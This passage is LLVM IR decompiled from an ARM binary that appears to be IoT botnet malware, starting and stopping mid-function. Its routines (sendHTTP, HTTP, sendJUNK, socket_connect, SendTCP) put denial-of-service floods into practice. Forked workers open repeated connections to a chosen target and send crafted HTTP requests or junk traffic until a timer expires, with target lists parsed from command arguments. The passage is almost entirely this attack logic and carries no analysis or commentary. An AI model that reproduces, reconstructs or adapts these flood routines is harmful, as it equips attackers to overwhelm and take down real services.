  store i32 268481540, i32* @lr, align 4
  %v4_1000b400 = call i32 @__GI_strtok(i32 %v2_1000b2a0, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v1_1000b500 = add i32 %v1_1000b370, -1
  %v3_1000b5085 = icmp sgt i32 %v1_1000b500, 0
  br i1 %v3_1000b5085, label %dec_label_pc_1000b418, label %dec_label_pc_1000b510

dec_label_pc_1000b418:                            ; preds = %dec_label_pc_1000b358, %dec_label_pc_1000b418
  %storemerge37 = phi i32 [ %v1_1000b4f4, %dec_label_pc_1000b418 ], [ 0, %dec_label_pc_1000b358 ]
  store i32 %storemerge37, i32* @r11, align 4
  %v1_1000b424 = mul i32 %storemerge37, 28
  %v2_1000b428 = add i32 %v1_1000b424, %v1_1000b3dc
  %v2_1000b42c = inttoptr i32 %v2_1000b428 to i32*
  store i32 %storemerge37, i32* %v2_1000b42c, align 4
  %v1_1000b440 = add i32 %v2_1000b428, 4
  %v2_1000b448 = inttoptr i32 %v1_1000b440 to i32*
  store i32 %v1_1000b2b8, i32* %v2_1000b448, align 4
  %v1_1000b45c = add i32 %v2_1000b428, 8
  %v2_1000b464 = inttoptr i32 %v1_1000b45c to i32*
  store i32 %v1_1000b2d4, i32* %v2_1000b464, align 4
  %v1_1000b478 = add i32 %v2_1000b428, 12
  %v2_1000b480 = inttoptr i32 %v1_1000b478 to i32*
  store i32 %v2_1000b2e8, i32* %v2_1000b480, align 4
  %v1_1000b494 = add i32 %v2_1000b428, 16
  %v2_1000b49c = inttoptr i32 %v1_1000b494 to i32*
  store i32 %v1_1000b30c, i32* %v2_1000b49c, align 4
  %v1_1000b4b0 = add i32 %v2_1000b428, 20
  %v2_1000b4b8 = inttoptr i32 %v1_1000b4b0 to i32*
  store i32 %storemerge1, i32* %v2_1000b4b8, align 4
  %v1_1000b4cc = add i32 %v2_1000b428, 24
  %v2_1000b4d4 = inttoptr i32 %v1_1000b4cc to i32*
  store i32 32, i32* %v2_1000b4d4, align 4
  %v3_1000b4ec = call i32 @SendTCP(i32* %v2_1000b42c, i32 %v1_1000b3dc)
  %v1_1000b4f4 = add nuw nsw i32 %storemerge37, 1
  %v3_1000b508 = icmp sgt i32 %v1_1000b500, %v1_1000b4f4
  br i1 %v3_1000b508, label %dec_label_pc_1000b418, label %dec_label_pc_1000b510

dec_label_pc_1000b510:                            ; preds = %dec_label_pc_1000b418, %dec_label_pc_1000b358
  %v8_1000b534 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_1002ba9c.469 to i32), i32 %arg2, i32 %v4_1000b400)
  store i32 ptrtoint ([3 x i8]* @global_var_1000b544.470 to i32), i32* @lr, align 4
  %v1_1000b540 = call i32 @sleep(i32 %v1_1000b2d4)
  %v0_1000b548 = call i32 @__GI_exit()
  br label %dec_label_pc_1000b54c

dec_label_pc_1000b54c:                            ; preds = %entry, %dec_label_pc_1000b27c, %dec_label_pc_1000b510
  %v0_1000b570 = phi i32 [ %v1_1000b1c0, %entry ], [ %v6_1000b290, %dec_label_pc_1000b27c ], [ %v0_1000b548, %dec_label_pc_1000b510 ]
  ret i32 %v0_1000b570

; uselistorder directives
  uselistorder i32 %v1_1000b4f4, { 1, 0 }
  uselistorder i32 %storemerge37, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000b500, { 1, 0 }
  uselistorder i32 %v1_1000b3dc, { 1, 0 }
  uselistorder i32 %arg4, { 1, 2, 3, 4, 5, 0, 6, 7 }
  uselistorder label %dec_label_pc_1000b54c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b418, { 1, 0 }
  uselistorder label %dec_label_pc_1000b358, { 1, 0 }
  uselistorder label %dec_label_pc_1000b320, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268481956, i32* @lr, align 4
  %v1_1000b5a0 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_1000b5b0 = icmp eq i32 %v1_1000b5a0, 0
  br i1 %v3_1000b5b0, label %dec_label_pc_1000b5b8, label %dec_label_pc_1000b5c4

dec_label_pc_1000b5b8:                            ; preds = %entry
  br label %dec_label_pc_1000b69c

dec_label_pc_1000b5c4:                            ; preds = %entry
  %v1_1000b5c8 = add i32 %v1_1000b5a0, 16
  %v2_1000b5c8 = inttoptr i32 %v1_1000b5c8 to i32*
  %v3_1000b5c8 = load i32, i32* %v2_1000b5c8, align 4
  %v1_1000b5cc = inttoptr i32 %v3_1000b5c8 to i32*
  %v2_1000b5cc = load i32, i32* %v1_1000b5cc, align 4
  %v1_1000b5d4 = add i32 %v1_1000b5a0, 12
  %v2_1000b5d4 = inttoptr i32 %v1_1000b5d4 to i32*
  %v3_1000b5d4 = load i32, i32* %v2_1000b5d4, align 4
  %v2_1000b5dc = ptrtoint i32* %stack_var_-48 to i32
  %v2_1000b5e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_1000b5d4, i32* @r5, align 4
  store i32 268482036, i32* @lr, align 4
  %v4_1000b5f0 = call i32 @bcopy(i32 %v2_1000b5cc, i32 %v2_1000b5e0, i32 %v3_1000b5d4, i32 %v2_1000b5dc)
  %v4_1000b5f4 = zext i16 %arg2 to i32
  store i32 %v4_1000b5f4, i32* @r3, align 4
  %v1_1000b600 = call i32 @htons(i32 %v4_1000b5f4)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268482084, i32* @lr, align 4
  %v3_1000b620 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_1000b62c = ptrtoint i32* %stack_var_-32 to i32
  store i32 268482120, i32* @lr, align 4
  %v5_1000b644 = call i32 @__GI_setsockopt(i32 %v3_1000b620, i32 6, i32 1, i32 %v2_1000b62c, i32 4)
  %v4_1000b650 = icmp eq i32 %v3_1000b620, -1
  br i1 %v4_1000b650, label %dec_label_pc_1000b658, label %dec_label_pc_1000b664

dec_label_pc_1000b658:                            ; preds = %dec_label_pc_1000b5c4
  br label %dec_label_pc_1000b69c

dec_label_pc_1000b664:                            ; preds = %dec_label_pc_1000b5c4
  store i32 268482168, i32* @lr, align 4
  %v3_1000b674 = call i32 @connect(i32 %v3_1000b620, i32 %v2_1000b5dc, i32 16)
  %v4_1000b680 = icmp eq i32 %v3_1000b674, -1
  br i1 %v4_1000b680, label %dec_label_pc_1000b688, label %dec_label_pc_1000b694

dec_label_pc_1000b688:                            ; preds = %dec_label_pc_1000b664
  br label %dec_label_pc_1000b69c

dec_label_pc_1000b694:                            ; preds = %dec_label_pc_1000b664
  br label %dec_label_pc_1000b69c

dec_label_pc_1000b69c:                            ; preds = %dec_label_pc_1000b688, %dec_label_pc_1000b658, %dec_label_pc_1000b5b8, %dec_label_pc_1000b694
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_1000b5b8 ], [ 0, %dec_label_pc_1000b658 ], [ 0, %dec_label_pc_1000b688 ], [ %v3_1000b620, %dec_label_pc_1000b694 ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v2_1000b5dc, { 1, 0 }
  uselistorder i32 %v3_1000b5d4, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_1000b69c, { 3, 0, 1, 2 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg6, i32* @r8, align 4
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1128 = alloca i32, align 4
  store i32 268482324, i32* @lr, align 4
  %v1_1000b710 = call i32 @__GI_time(i32 0)
  %v2_1000b71c = add i32 %v1_1000b710, %arg5
  store i32 268482344, i32* @lr, align 4
  %v0_1000b724 = call i32 @random()
  %v1_1000b73c = urem i32 %v0_1000b724, 49
  %v1_1000b760 = mul nuw nsw i32 %v1_1000b73c, 4
  %v2_1000b764 = add i32 %v1_1000b760, ptrtoint ([255 x i8*]* @global_var_100402b4.245 to i32)
  %v1_1000b768 = inttoptr i32 %v2_1000b764 to i32*
  %v2_1000b768 = load i32, i32* %v1_1000b768, align 4
  store i32 268482420, i32* @lr, align 4
  %v0_1000b770 = call i32 @random()
  %v2_1000b788 = srem i32 %v0_1000b770, 3
  %v1_1000b7a4 = mul nsw i32 %v2_1000b788, 4
  %v2_1000b7a8 = ptrtoint i32* %stack_var_-1128 to i32
  %v2_1000b7ac = add i32 %v2_1000b7a8, 24
  %v1_1000b7b0 = add i32 %v2_1000b7ac, %v1_1000b7a4
  %v1_1000b7b4 = inttoptr i32 %v1_1000b7b0 to i32*
  %v2_1000b7b4 = load i32, i32* %v1_1000b7b4, align 4
  store i32 %arg2, i32* @r3, align 4
  %v0_1000b7c0 = call i32 @__GI_strlen()
  store i32 %arg4, i32* @r3, align 4
  %v0_1000b7cc = call i32 @__GI_strlen()
  %v2_1000b7d4 = add i32 %v0_1000b7c0, %v0_1000b7cc
  store i32 %v2_1000b768, i32* @r3, align 4
  %v0_1000b7dc = call i32 @__GI_strlen()
  %v2_1000b7e4 = add i32 %v2_1000b7d4, %v0_1000b7dc
  store i32 %v2_1000b7b4, i32* @r3, align 4
  %v0_1000b7ec = call i32 @__GI_strlen()
  %v2_1000b7f4 = add i32 %v2_1000b7e4, %v0_1000b7ec
  %v1_1000b7f8 = add i32 %v2_1000b7f4, 55
  %v2_1000b804 = icmp sgt i32 %v1_1000b7f8, 1023
  br i1 %v2_1000b804, label %dec_label_pc_1000b8f0, label %dec_label_pc_1000b80c

dec_label_pc_1000b80c:                            ; preds = %entry
  %v2_1000b810 = ptrtoint i32* %stack_var_-1092 to i32
  store i32 %v2_1000b810, i32* @r3, align 4
  store i32 %v1_1000b7f8, i32* @r4, align 4
  store i32 ptrtoint ([64 x i8]* @global_var_1002bafc.477 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000b83c.478 to i32), i32* @lr, align 4
  %v9_1000b838 = call i32 @__GI_snprintf(i32 %v2_1000b810, i32 %v1_1000b7f8, i32 ptrtoint ([64 x i8]* @global_var_1002bafc.477 to i32), i32 %arg2, i32 %arg4, i32 %v2_1000b768, i32 %v2_1000b7b4, i32 %v1_1000b7f8)
  %v2_1000b8e811 = icmp sgt i32 %arg6, 0
  br i1 %v2_1000b8e811, label %dec_label_pc_1000b848.lr.ph, label %dec_label_pc_1000b8f0

dec_label_pc_1000b848.lr.ph:                      ; preds = %dec_label_pc_1000b80c
  %v2_1000b870 = trunc i32 %arg3 to i16
  br label %dec_label_pc_1000b848

dec_label_pc_1000b848:                            ; preds = %dec_label_pc_1000b848.lr.ph, %dec_label_pc_1000b8d4
  %storemerge614 = phi i32 [ 0, %dec_label_pc_1000b848.lr.ph ], [ %v1_1000b8d8, %dec_label_pc_1000b8d4 ]
  store i32 268482636, i32* @lr, align 4
  %v0_1000b848 = call i32 @fork()
  %v3_1000b850 = icmp eq i32 %v0_1000b848, 0
  br i1 %v3_1000b850, label %dec_label_pc_1000b8d4, label %dec_label_pc_1000b8b4.preheader

dec_label_pc_1000b8b4.preheader:                  ; preds = %dec_label_pc_1000b848
  store i32 268482748, i32* @lr, align 4
  %v1_1000b8b87 = call i32 @__GI_time(i32 0)
  %v2_1000b8c48 = icmp slt i32 %v1_1000b8b87, %v2_1000b71c
  br i1 %v2_1000b8c48, label %dec_label_pc_1000b85c, label %dec_label_pc_1000b8cc

dec_label_pc_1000b85c:                            ; preds = %dec_label_pc_1000b8b4.preheader, %dec_label_pc_1000b8b4.backedge
  %v3_1000b870 = call i32 @socket_connect(i32 %arg1, i16 %v2_1000b870)
  store i32 %v3_1000b870, i32* %stack_var_-1128, align 4
  %v3_1000b880 = icmp eq i32 %v3_1000b870, 0
  br i1 %v3_1000b880, label %dec_label_pc_1000b8b4.backedge, label %dec_label_pc_1000b888

dec_label_pc_1000b888:                            ; preds = %dec_label_pc_1000b85c
  store i32 %v2_1000b810, i32* @r3, align 4
  %v0_1000b890 = call i32 @__GI_strlen()
  %v3_1000b89c = load i32, i32* %stack_var_-1128, align 4
  store i32 268482732, i32* @lr, align 4
  %v3_1000b8a8 = call i32 @write(i32 %v3_1000b89c, i32 %v2_1000b810, i32 %v0_1000b890)
  %v3_1000b8ac = load i32, i32* %stack_var_-1128, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000b8b4.479 to i32), i32* @lr, align 4
  %v1_1000b8b0 = call i32 @close(i32 %v3_1000b8ac)
  br label %dec_label_pc_1000b8b4.backedge

dec_label_pc_1000b8b4.backedge:                   ; preds = %dec_label_pc_1000b888, %dec_label_pc_1000b85c
  store i32 268482748, i32* @lr, align 4
  %v1_1000b8b8 = call i32 @__GI_time(i32 0)
  %v2_1000b8c4 = icmp slt i32 %v1_1000b8b8, %v2_1000b71c
  br i1 %v2_1000b8c4, label %dec_label_pc_1000b85c, label %dec_label_pc_1000b8cc

dec_label_pc_1000b8cc:                            ; preds = %dec_label_pc_1000b8b4.backedge, %dec_label_pc_1000b8b4.preheader
  %v1_1000b8d0 = call i32 @__GI__exit(i32 1)
  br label %dec_label_pc_1000b8d4

dec_label_pc_1000b8d4:                            ; preds = %dec_label_pc_1000b848, %dec_label_pc_1000b8cc
  %v0_1000b90817 = phi i32 [ 0, %dec_label_pc_1000b848 ], [ %v1_1000b8d0, %dec_label_pc_1000b8cc ]
  %v1_1000b8d8 = add nuw nsw i32 %storemerge614, 1
  %v2_1000b8e8 = icmp slt i32 %v1_1000b8d8, %arg6
  br i1 %v2_1000b8e8, label %dec_label_pc_1000b848, label %dec_label_pc_1000b8f0

dec_label_pc_1000b8f0:                            ; preds = %dec_label_pc_1000b8d4, %dec_label_pc_1000b80c, %entry
  %v0_1000b908 = phi i32 [ %v0_1000b7ec, %entry ], [ %v9_1000b838, %dec_label_pc_1000b80c ], [ %v0_1000b90817, %dec_label_pc_1000b8d4 ]
  ret i32 %v0_1000b908

; uselistorder directives
  uselistorder i32 %v2_1000b810, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000b7f8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000b7ec, { 1, 0 }
  uselistorder i32 %v2_1000b71c, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @write, { 2, 1, 0 }
  uselistorder i32 268482748, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @__GI_snprintf, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b8d4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b85c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b848, { 1, 0 }
}

define i32 @HTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_1000b948 = call i32 @mfork(i32 %arg2)
  %v3_1000b950 = icmp eq i32 %v1_1000b948, 0
  br i1 %v3_1000b950, label %dec_label_pc_1000b958, label %dec_label_pc_1000bb74

dec_label_pc_1000b958:                            ; preds = %entry
  %v2_1000b95c = icmp sgt i32 %arg3, 5
  br i1 %v2_1000b95c, label %dec_label_pc_1000b97c, label %dec_label_pc_1000b964

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b958
  %v6_1000b978 = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_1002bb3c.480 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000b97c

dec_label_pc_1000b97c:                            ; preds = %dec_label_pc_1000b958, %dec_label_pc_1000b964
  %v1_1000b980 = add i32 %arg4, 8
  %v1_1000b984 = inttoptr i32 %v1_1000b980 to i32*
  %v2_1000b984 = load i32, i32* %v1_1000b984, align 4
  store i32 %v2_1000b984, i32* @r29, align 4
  %v1_1000b98c = add i32 %arg4, 24
  %v1_1000b990 = inttoptr i32 %v1_1000b98c to i32*
  %v2_1000b990 = load i32, i32* %v1_1000b990, align 4
  store i32 268482972, i32* @lr, align 4
  %v1_1000b998 = call i32 @atol(i32 %v2_1000b990)
  %v0_1000b9b0 = load i32, i32* @r29, align 4
  %v7_1000b9bc = call i32 @Send(i32 %arg1, i32 ptrtoint ([46 x i8]* @global_var_1002bb7c.481 to i32), i32 %arg2, i32 %v0_1000b9b0)
  %v1_1000b9c4 = add i32 %arg4, 4
  %v1_1000b9c8 = inttoptr i32 %v1_1000b9c4 to i32*
  %v2_1000b9c8 = load i32, i32* %v1_1000b9c8, align 4
  store i32 %v2_1000b9c8, i32* @r3, align 4
  store i32 268483032, i32* @lr, align 4
  %v2_1000b9d4 = call i32 @__GI_strchr(i32 %v2_1000b9c8, i32 44)
  %v3_1000b9dc = icmp eq i32 %v2_1000b9d4, 0
  br i1 %v3_1000b9dc, label %dec_label_pc_1000bad4, label %dec_label_pc_1000b9e4

dec_label_pc_1000b9e4:                            ; preds = %dec_label_pc_1000b97c
  %v2_1000b9ec = load i32, i32* %v1_1000b9c8, align 4
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
  store i32 268483072, i32* @lr, align 4
  %v4_1000b9fc = call i32 @__GI_strtok(i32 %v2_1000b9ec, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_1000bac85 = icmp eq i32 %v4_1000b9fc, 0
  br i1 %v3_1000bac85, label %dec_label_pc_1000bb74, label %dec_label_pc_1000ba0c.lr.ph

dec_label_pc_1000ba0c.lr.ph:                      ; preds = %dec_label_pc_1000b9e4
  %v1_1000ba38 = add i32 %arg4, 12
  %v1_1000ba3c = inttoptr i32 %v1_1000ba38 to i32*
  %v1_1000ba5c = add i32 %arg4, 20
  %v1_1000ba60 = inttoptr i32 %v1_1000ba5c to i32*
  br label %dec_label_pc_1000ba0c

dec_label_pc_1000ba0c:                            ; preds = %dec_label_pc_1000ba0c.lr.ph, %dec_label_pc_1000baac
  store i32 268483088, i32* @lr, align 4
  %v0_1000ba0c = call i32 @listFork()
  %v3_1000ba14 = icmp eq i32 %v0_1000ba0c, 0
  br i1 %v3_1000ba14, label %dec_label_pc_1000ba1c, label %dec_label_pc_1000baac

dec_label_pc_1000ba1c:                            ; preds = %dec_label_pc_1000ba0c
  %v2_1000ba24 = load i32, i32* %v1_1000b9c8, align 4
  store i32 %v2_1000ba24, i32* @r29, align 4
  %v2_1000ba3c = load i32, i32* %v1_1000ba3c, align 4
  store i32 268483144, i32* @lr, align 4
  %v1_1000ba44 = call i32 @atol(i32 %v2_1000ba3c)
  store i32 %v1_1000ba44, i32* @r27, align 4
  %v2_1000ba60 = load i32, i32* %v1_1000ba60, align 4
  store i32 268483180, i32* @lr, align 4
  %v1_1000ba68 = call i32 @atol(i32 %v2_1000ba60)
  %v2_1000ba78 = load i32, i32* %v1_1000b990, align 4
  store i32 268483204, i32* @lr, align 4
  %v1_1000ba80 = call i32 @atol(i32 %v2_1000ba78)
  %v0_1000ba88 = load i32, i32* @r29, align 4
  %v0_1000ba8c = load i32, i32* @r28, align 4
  %v0_1000ba90 = load i32, i32* @r27, align 4
  %v0_1000ba94 = load i32, i32* @r26, align 4
  %v0_1000ba98 = load i32, i32* @r25, align 4
  %v6_1000baa0 = call i32 @sendHTTP(i32 %v0_1000ba88, i32 %v0_1000ba8c, i32 %v0_1000ba90, i32 %v0_1000ba94, i32 %v0_1000ba98, i32 %v1_1000ba80)
  %v1_1000baa8 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000baac

dec_label_pc_1000baac:                            ; preds = %dec_label_pc_1000ba0c, %dec_label_pc_1000ba1c
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
  store i32 268483260, i32* @lr, align 4
  %v4_1000bab8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_1000bac8 = icmp eq i32 %v4_1000bab8, 0
  br i1 %v3_1000bac8, label %dec_label_pc_1000bb74, label %dec_label_pc_1000ba0c

dec_label_pc_1000bad4:                            ; preds = %dec_label_pc_1000b97c
  store i32 268483288, i32* @lr, align 4
  %v0_1000bad4 = call i32 @listFork()
  %v3_1000badc = icmp eq i32 %v0_1000bad4, 0
  br i1 %v3_1000badc, label %dec_label_pc_1000bae4, label %dec_label_pc_1000bb74

dec_label_pc_1000bae4:                            ; preds = %dec_label_pc_1000bad4
  %v2_1000baec = load i32, i32* %v1_1000b9c8, align 4
  store i32 %v2_1000baec, i32* @r29, align 4
  %v1_1000bb00 = add i32 %arg4, 12
  %v1_1000bb04 = inttoptr i32 %v1_1000bb00 to i32*
  %v2_1000bb04 = load i32, i32* %v1_1000bb04, align 4
  store i32 268483344, i32* @lr, align 4
  %v1_1000bb0c = call i32 @atol(i32 %v2_1000bb04)
  store i32 %v1_1000bb0c, i32* @r27, align 4
  %v1_1000bb24 = add i32 %arg4, 20
  %v1_1000bb28 = inttoptr i32 %v1_1000bb24 to i32*
  %v2_1000bb28 = load i32, i32* %v1_1000bb28, align 4
  store i32 268483380, i32* @lr, align 4
  %v1_1000bb30 = call i32 @atol(i32 %v2_1000bb28)
  %v2_1000bb40 = load i32, i32* %v1_1000b990, align 4
  store i32 268483404, i32* @lr, align 4
  %v1_1000bb48 = call i32 @atol(i32 %v2_1000bb40)
  %v0_1000bb50 = load i32, i32* @r29, align 4
  %v0_1000bb54 = load i32, i32* @r28, align 4
  %v0_1000bb58 = load i32, i32* @r27, align 4
  %v0_1000bb5c = load i32, i32* @r26, align 4
  %v0_1000bb60 = load i32, i32* @r25, align 4
  %v6_1000bb68 = call i32 @sendHTTP(i32 %v0_1000bb50, i32 %v0_1000bb54, i32 %v0_1000bb58, i32 %v0_1000bb5c, i32 %v0_1000bb60, i32 %v1_1000bb48)
  %v1_1000bb70 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000bb74

dec_label_pc_1000bb74:                            ; preds = %dec_label_pc_1000baac, %dec_label_pc_1000b9e4, %dec_label_pc_1000bad4, %entry, %dec_label_pc_1000bae4
  %v0_1000bb9c = phi i32 [ %v0_1000bad4, %dec_label_pc_1000bad4 ], [ %v1_1000b948, %entry ], [ %v1_1000bb70, %dec_label_pc_1000bae4 ], [ 0, %dec_label_pc_1000b9e4 ], [ 0, %dec_label_pc_1000baac ]
  ret i32 %v0_1000bb9c

; uselistorder directives
  uselistorder i32* %v1_1000b9c8, { 2, 0, 1, 3 }
  uselistorder i32* %v1_1000b990, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendHTTP, { 1, 0 }
  uselistorder i32 ()* @listFork, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), { 0, 9, 1, 10, 2, 11, 3, 12, 4, 13, 5, 14, 6, 15, 7, 16, 8, 17 }
  uselistorder i32 %arg4, { 2, 3, 0, 1, 4, 6, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb74, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000baac, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba0c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b97c, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000bba0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000bba0, i32* %stack_var_-256, align 4
  store i32 268483536, i32* @lr, align 4
  %v0_1000bbcc = call i32 @getdtablesize()
  %v1_1000bbd4 = udiv i32 %v0_1000bbcc, 2
  %v2_1000bbd4 = and i32 %v0_1000bbcc, -2147483648
  %v3_1000bbd4 = or i32 %v1_1000bbd4, %v2_1000bbd4
  store i32 2, i32* %stack_var_-212, align 4
  %v1_1000bbec = urem i32 %arg2, 65536
  store i32 %v1_1000bbec, i32* @r3, align 4
  %v1_1000bbf4 = call i32 @htons(i32 %v1_1000bbec)
  %v2_1000bc00 = ptrtoint i32* %stack_var_-212 to i32
  %v4_1000bc10 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-208, i32 %v2_1000bc00)
  %v3_1000bc18 = icmp eq i32 %v4_1000bc10, 0
  br i1 %v3_1000bc18, label %dec_label_pc_1000bc24, label %dec_label_pc_1000c100

dec_label_pc_1000bc24:                            ; preds = %entry
  %v2_1000bc28 = ptrtoint i32* %stack_var_-204 to i32
  store i32 %v2_1000bc28, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268483644, i32* @lr, align 4
  %v0_1000bc38 = call i32 @__GI_memset()
  %v1_1000bc40 = mul i32 %v1_1000bbd4, 8
  %v1_1000bc48 = add i32 %v1_1000bc40, 30
  %v1_1000bc4c = and i32 %v1_1000bc48, -16
  %v2_1000bc54 = load i32, i32* %stack_var_-256, align 4
  %v1_1000bc5c = load i32, i32* @r1, align 4
  %v3_1000bc5c = sub i32 %v1_1000bc5c, %v1_1000bc4c
  %v4_1000bc5c = inttoptr i32 %v3_1000bc5c to i32*
  store i32 %v2_1000bc54, i32* %v4_1000bc5c, align 4
  %v1_1000bc6c = add i32 %v3_1000bc5c, 23
  %v1_1000bc70 = and i32 %v1_1000bc6c, -16
  %v1_1000bc8c = mul i32 %v3_1000bbd4, 5
  store i32 %v1_1000bc70, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v1_1000bc8c, i32* @r5, align 4
  store i32 268483744, i32* @lr, align 4
  %v0_1000bc9c = call i32 @__GI_memset()
  store i32 1024, i32* @r3, align 4
  store i32 268483752, i32* @lr, align 4
  %v0_1000bca4 = call i32 @malloc()
  store i32 %v0_1000bca4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1024, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000bcc0.485 to i32), i32* @lr, align 4
  %v0_1000bcbc = call i32 @__GI_memset()
  store i32 268483792, i32* @lr, align 4
  %v1_1000bccc = call i32 @__GI_time(i32 0)
  %v2_1000bcd8 = add i32 %v1_1000bccc, %arg3
  store i32 268484848, i32* @lr, align 4
  %v1_1000c0ec10 = call i32 @__GI_time(i32 0)
  %v2_1000c0f811 = icmp slt i32 %v1_1000c0ec10, %v2_1000bcd8
  br i1 %v2_1000c0f811, label %dec_label_pc_1000c0d8.preheader.lr.ph, label %dec_label_pc_1000c100

dec_label_pc_1000c0d8.preheader.lr.ph:            ; preds = %dec_label_pc_1000bc24
  %v2_1000c0e05 = icmp sgt i32 %v3_1000bbd4, 0
  %v2_1000be3c = ptrtoint i32* %stack_var_-196 to i32
  %v2_1000bea0 = ptrtoint i32* %stack_var_-248 to i32
  %v2_1000bea4 = add i32 %v2_1000bea0, 52
  %v2_1000bf14 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1000bf60 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000bf64 = ptrtoint i32* %stack_var_-60 to i32
  br label %dec_label_pc_1000c0d8.preheader

dec_label_pc_1000bcf0:                            ; preds = %dec_label_pc_1000c0d8.preheader, %dec_label_pc_1000c0cc
  %storemerge28 = phi i32 [ %v1_1000c0d0, %dec_label_pc_1000c0cc ], [ 0, %dec_label_pc_1000c0d8.preheader ]
  %v1_1000bcf8 = mul i32 %storemerge28, 8
  %v2_1000bcfc = add i32 %v1_1000bcf8, %v1_1000bc70
  %v1_1000bd00 = or i32 %v2_1000bcfc, 4
  %v2_1000bd00 = inttoptr i32 %v1_1000bd00 to i8*
  %v3_1000bd00 = load i8, i8* %v2_1000bd00, align 4
  %v1_1000bd10 = icmp eq i8 %v3_1000bd00, 0
  %v3_1000bd10 = icmp eq i8 %v3_1000bd00, 1
  br i1 %v3_1000bd10, label %dec_label_pc_1000be3c, label %dec_label_pc_1000bd18

dec_label_pc_1000bd18:                            ; preds = %dec_label_pc_1000bcf0
  %v3_1000bd1c = icmp eq i8 %v3_1000bd00, 2
  br i1 %v3_1000bd1c, label %dec_label_pc_1000c028, label %dec_label_pc_1000bd24

dec_label_pc_1000bd24:                            ; preds = %dec_label_pc_1000bd18
  br i1 %v1_1000bd10, label %dec_label_pc_1000bd34, label %dec_label_pc_1000c0cc

dec_label_pc_1000bd34:                            ; preds = %dec_label_pc_1000bd24
  store i32 268483912, i32* @lr, align 4
  %v3_1000bd44 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000bd50 = mul i32 %storemerge28, 8
  %v2_1000bd54 = add i32 %v1_1000bd50, %v1_1000bc70
  %v2_1000bd58 = inttoptr i32 %v2_1000bd54 to i32*
  store i32 %v3_1000bd44, i32* %v2_1000bd58, align 8
  %v1_1000bd6c = inttoptr i32 %v2_1000bcfc to i32*
  %v2_1000bd80 = load i32, i32* %v1_1000bd6c, align 8
  store i32 268483992, i32* @lr, align 4
  %v3_1000bd94 = call i32 @fcntl(i32 %v2_1000bd80, i32 3, i32 0)
